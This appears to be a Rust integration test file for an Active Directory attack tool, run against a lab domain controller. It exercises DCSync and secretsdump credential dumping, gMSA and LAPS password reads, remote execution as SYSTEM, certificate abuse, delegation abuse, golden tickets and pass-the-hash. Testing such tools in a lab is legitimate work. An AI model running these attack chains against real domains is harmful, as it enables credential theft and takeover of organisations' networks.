//! Live impact integration tests against a real DC. All are `#[ignore]`d so the normal
//! `cargo test` stays hermetic; run them explicitly against a lab:
//!
//!   ADH_IMPACT=1 ADH_DC=10.0.0.1 ADH_DOMAIN=CORP ADH_REALM=CORP.LOCAL \
//!   ADH_USER=Administrator ADH_PASS='...' cargo test -p adhammer --test live_impact -- --ignored --test-threads=1
//!
//! Optional per-test gates: `ADH_CA`, `ADH_TEMPLATE`, `ADH_GMSA`, `ADH_LAPS_TARGET`,
//! `ADH_LAPS_EXPECT`, `ADH_DELEG_ACCT`, `ADH_DELEG_PASS`, `ADH_DELEG_SPN`,
//! `ADH_KRBTGT_AES256`, `ADH_DOMAIN_SID`, `ADH_SPN`, `ADH_OPTH_USER`, `ADH_OPTH_HASH`.

mod common;

use common::{dc, domain, env, impact_enabled, pass, realm, run, user};

#[test]
#[ignore = "live DC"]
fn dcsync_krbtgt_returns_nt_hash() {
    if !impact_enabled() {
        return;
    }
    let Some(o) = run(&[
        "attack",
        "dcsync",
        "--host",
        &dc(),
        "--domain",
        &domain(),
        "--user",
        &user(),
        "--password",
        &pass(),
        "--target",
        "krbtgt",
    ]) else {
        return;
    };
    let line = o
        .lines()
        .find(|l| l.starts_with("krbtgt:"))
        .expect("krbtgt line");
    let nt = line.split(':').nth(3).unwrap_or("");
    assert_eq!(nt.len(), 32, "krbtgt NT hash must be 32 hex: {line}");
    assert!(nt.chars().all(|c| c.is_ascii_hexdigit()));
    let aes = o
        .lines()
        .find(|l| l.starts_with("krbtgt:aes256-cts-hmac-sha1-96:"))
        .and_then(|l| l.rsplit(':').next())
        .expect("krbtgt aes256 key line");
    assert_eq!(aes.len(), 64, "krbtgt AES256 key must be 64 hex: {aes}");
    assert!(aes.chars().all(|c| c.is_ascii_hexdigit()));
}

#[test]
#[ignore = "live DC"]
fn exec_runs_as_system() {
    if !impact_enabled() {
        return;
    }
    let Some(o) = run(&[
        "attack",
        "exec",
        "--host",
        &dc(),
        "--domain",
        &domain(),
        "--user",
        &user(),
        "--password",
        &pass(),
        "--command",
        "whoami",
    ]) else {
        return;
    };
    assert!(
        o.to_lowercase().contains("nt authority\\system"),
        "exec should run as SYSTEM:\n{o}"
    );
}

#[test]
#[ignore = "live DC"]
fn secretsdump_dumps_machine_and_sam() {
    if !impact_enabled() {
        return;
    }
    let Some(o) = run(&[
        "attack",
        "secretsdump",
        "--host",
        &dc(),
        "--domain",
        &domain(),
        "--user",
        &user(),
        "--password",
        &pass(),
    ]) else {
        return;
    };
    assert!(o.contains("SYSTEM "), "should pull the SYSTEM hive:\n{o}");
    let dumped = o.contains("Administrator:500:") || o.contains("$MACHINE.ACC:");
    let degraded = o.contains("unavailable");
    assert!(
        dumped || degraded,
        "secretsdump should dump SAM/LSA or report the hive unavailable:\n{o}"
    );
}

#[test]
#[ignore = "live DC"]
fn gmsa_read_returns_nt_hash() {
    if !impact_enabled() {
        return;
    }
    let url = format!("ldaps://{}:636", dc());
    let target = env("ADH_GMSA").unwrap_or_else(|| "gmsa_web$".into());
    let bind_user = format!("{}\\{}", domain(), user());
    let Some(o) = run(&[
        "attack",
        "gmsa",
        "--url",
        &url,
        "--user",
        &bind_user,
        "--password",
        &pass(),
        "--insecure",
        "--target",
        &target,
    ]) else {
        return;
    };
    let line = o.lines().find(|l| l.contains(&target)).expect("gmsa line");
    let nt = line.split(':').nth(2).unwrap_or("");
    assert_eq!(nt.len(), 32, "gMSA NT hash must be 32 hex: {line}");
}

#[test]
#[ignore = "live DC"]
fn laps_reads_cleartext() {
    if !impact_enabled() {
        return;
    }
    let Some(target) = env("ADH_LAPS_TARGET") else {
        return;
    };
    let url = format!("ldaps://{}:636", dc());
    let bind_user = format!("{}\\{}", domain(), user());
    let Some(o) = run(&[
        "attack",
        "laps",
        "--url",
        &url,
        "--user",
        &bind_user,
        "--password",
        &pass(),
        "--insecure",
        "--target",
        &target,
    ]) else {
        return;
    };
    let line = o.lines().find(|l| l.contains(&target)).expect("laps line");
    let pw = line.split('\t').nth(2).unwrap_or("");
    assert!(!pw.is_empty(), "no cleartext LAPS password parsed: {line}");
    if let Some(expect) = env("ADH_LAPS_EXPECT") {
        assert!(
            pw.contains(&expect),
            "LAPS password {pw} != expected {expect}"
        );
    }
}

#[test]
#[ignore = "live DC"]
fn winrm_runs_command() {
    if !impact_enabled() {
        return;
    }
    let Some(o) = run(&[
        "attack",
        "winrm",
        "--host",
        &dc(),
        "--domain",
        &domain(),
        "--user",
        &user(),
        "--password",
        &pass(),
        "--command",
        "whoami",
    ]) else {
        return;
    };
    assert!(
        o.contains("WinRM shell opened"),
        "no WinRM shell established:\n{o}"
    );
    assert!(
        o.to_lowercase().contains(&user().to_lowercase()),
        "whoami over WinRM should echo the user:\n{o}"
    );
    assert!(o.contains("exited 0"), "expected clean exit:\n{o}");
}

#[test]
#[ignore = "live DC"]
fn esc1_enrolls_certificate() {
    if !impact_enabled() {
        return;
    }
    let Some(ca) = env("ADH_CA") else { return };
    let template = env("ADH_TEMPLATE").unwrap_or_else(|| "User".into());
    let upn = format!("{}@{}", user(), realm().to_lowercase());
    let out = std::env::temp_dir().join("adh_it.crt");
    let Some(o) = run(&[
        "attack",
        "esc1",
        "--host",
        &dc(),
        "--domain",
        &domain(),
        "--user",
        &user(),
        "--password",
        &pass(),
        "--ca",
        &ca,
        "--template",
        &template,
        "--upn",
        &upn,
        "--out",
        out.to_str().unwrap(),
    ]) else {
        return;
    };
    assert!(
        o.contains("certificate ISSUED"),
        "CA should issue a cert:\n{o}"
    );
}

#[test]
#[ignore = "live DC"]
fn constrained_delegation_s4u() {
    if !impact_enabled() {
        return;
    }
    let (acct, pw, spn) = match (
        env("ADH_DELEG_ACCT"),
        env("ADH_DELEG_PASS"),
        env("ADH_DELEG_SPN"),
    ) {
        (Some(a), Some(p), Some(s)) => (a, p, s),
        _ => return,
    };
    let Some(o) = run(&[
        "attack",
        "constrained",
        "--kdc",
        &dc(),
        "--realm",
        &realm(),
        "--account",
        &acct,
        "--account-password",
        &pw,
        "--impersonate",
        "Administrator",
        "--target-spn",
        &spn,
    ]) else {
        return;
    };
    assert!(
        o.contains("service ticket") || o.contains("succeeded"),
        "S4U chain should yield a ticket:\n{o}"
    );
}

#[test]
#[ignore = "live DC"]
fn dcsync_all_dumps_domain() {
    if !impact_enabled() {
        return;
    }
    let Some(o) = run(&[
        "attack",
        "dcsync",
        "--host",
        &dc(),
        "--domain",
        &domain(),
        "--user",
        &user(),
        "--password",
        &pass(),
        "--all",
    ]) else {
        return;
    };
    assert!(o.contains("krbtgt:502:"));
    assert!(o.contains("Administrator:500:"));
    assert!(o.contains("full-domain DCSync complete"));
}

#[test]
#[ignore = "live DC"]
fn golden_ticket_accepted() {
    if !impact_enabled() {
        return;
    }
    let (Some(key), Some(sid)) = (env("ADH_KRBTGT_AES256"), env("ADH_DOMAIN_SID")) else {
        return;
    };
    let spn = env("ADH_SPN").unwrap_or_else(|| {
        let host = env("ADH_NETBIOS").unwrap_or_else(|| "dc01".into());
        format!("cifs/{}.{}", host.to_lowercase(), realm().to_lowercase())
    });
    let Some(o) = run(&[
        "attack",
        "golden",
        "--kdc",
        &dc(),
        "--realm",
        &realm(),
        "--krbtgt-aes256",
        &key,
        "--domain-sid",
        &sid,
        "--verify-spn",
        &spn,
    ]) else {
        return;
    };
    assert!(
        o.contains("KDC accepted the golden ticket"),
        "golden ticket not accepted: {o}"
    );
}

#[test]
#[ignore = "live DC"]
fn pass_the_ticket_golden_exec() {
    if !impact_enabled() {
        return;
    }
    let (Some(key), Some(sid), Some(spn)) = (
        env("ADH_KRBTGT_AES256"),
        env("ADH_DOMAIN_SID"),
        env("ADH_SPN"),
    ) else {
        return;
    };
    let Some(o) = run(&[
        "attack",
        "pth",
        "--host",
        &dc(),
        "--kdc",
        &dc(),
        "--realm",
        &realm(),
        "--domain-sid",
        &sid,
        "--krbtgt-aes256",
        &key,
        "--spn",
        &spn,
        "--command",
        "whoami",
    ]) else {
        return;
    };
    assert!(
        o.contains("Kerberos SMB session established"),
        "no PtT session: {o}"
    );
    assert!(
        o.to_lowercase().contains("nt authority\\system"),
        "golden PtT did not run as SYSTEM: {o}"
    );
}

#[test]
#[ignore = "live DC"]
fn overpass_the_hash_gets_tgt() {
    if !impact_enabled() {
        return;
    }
    let (Some(user), Some(hash)) = (env("ADH_OPTH_USER"), env("ADH_OPTH_HASH")) else {
        return;
    };
    let out = std::env::temp_dir().join("adh_optt.ccache");
    let Some(o) = run(&[
        "attack",
        "asktgt",
        "--user",
        &user,
        "--realm",
        &realm(),
        "--kdc",
        &dc(),
        "--nt-hash",
        &hash,
        "--out",
        out.to_str().unwrap(),
    ]) else {
        return;
    };
    assert!(o.contains("TGT obtained"), "overpass-the-hash failed:\n{o}");
}
